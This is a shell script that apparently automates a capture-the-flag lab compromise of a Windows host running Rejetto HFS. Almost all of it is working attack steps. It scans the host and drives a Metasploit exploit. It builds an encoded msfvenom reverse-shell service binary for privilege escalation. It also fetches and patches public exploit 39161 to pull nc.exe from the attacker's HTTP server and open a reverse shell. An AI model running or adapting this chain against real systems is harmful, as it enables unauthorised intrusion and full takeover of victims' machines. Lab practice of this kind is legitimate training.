#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.32.55"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - INTRODUCTION"
nmap -p- -sC -sV -A -sS -T4 ${target_ip} > $result_folder/nmap-results.txt
curl -s -X GET $target_ip:80 -o $result_folder/index.html
dos2unix -q $result_folder/index.html
EMPLOYEE=$(cat $result_folder/index.html | sed -n 's/.*img\/\(.*\)\.png.*/\1/p' | grep -v 'logo') 
echo "Employee of the month is '$EMPLOYEE'"

echo "2 - INITIAL ACCESS"
echo "use exploit/windows/http/rejetto_hfs_exec" > $result_folder/metasploit.rc
echo "set RHOSTS 10.10.191.12" >> $result_folder/metasploit.rc
echo "set RPORT 8080" >> $result_folder/metasploit.rc
echo "set LHOST 10.9.5.12" >> $result_folder/metasploit.rc
echo "set LPORT 4444" >> $result_folder/metasploit.rc
echo "set SRVPORT 4443" >> $result_folder/metasploit.rc
echo "exploit" >> $result_folder/metasploit.rc
msfconsole -r $result_folder/metasploit.rc
# Look for C:\Users\bill\Desktop once shell is created

echo "3 - PRIVILEGE ESCALATION"
# upload /work/tryhackme/tools/PowerUp.ps1
# load powershell
# powershell_shell
# . .\PowerUp.ps1
# Invoke-AllChecks
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.5.12 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
# upload ASCService.exe 'C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe'
# nc -lvnp 4443
# sc start AdvancedSystemCareService9
# type C:\Users\Administrator\Desktop\root.txt

echo "4 - ACCESS AND ESCALATION WITHOUT METASPLOIT"
xterm -hold -e "python3 -m http.server 4444 --directory $result_folder" &
PID1=$!
xterm -hold -e "nc -lvnp 4443" &
PID2=$!
curl -s -XGET https://www.exploit-db.com/download/39161 -o $result_folder/39161.py
curl -s https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/a17f91745cafc5fa43a428d766294190c0ff70a1/winPEAS/winPEASexe/binaries/x86/Release/winPEASx86.exe -o $result_folder/winPEASx64.exe
curl -s https://github.com/andrew-d/static-binaries/blob/0be803093b7d4b627b4d4eddd732e54ac4184b67/binaries/windows/x86/ncat.exe -o $result_folder/nc.exe 
sed -i 's/192.168.44.128/'$attack_ip'/g' "$result_folder/39161.py"
sed -i 's/local_port = "443"/local_port = "4443"/g' "$result_folder/39161.py"
sed -i 's/%2F%2F"+ip_addr+"%2Fnc.exe/%2F%2F"+ip_addr+":4444%2Fnc.exe/g' "$result_folder/39161.py"
python2 $result_folder/39161.py $target_ip 8080 
python2 $result_folder/39161.py $target_ip 8080 
python2 $result_folder/39161.py $target_ip 8080 
kill -9 $PID1
kill -9 $PID2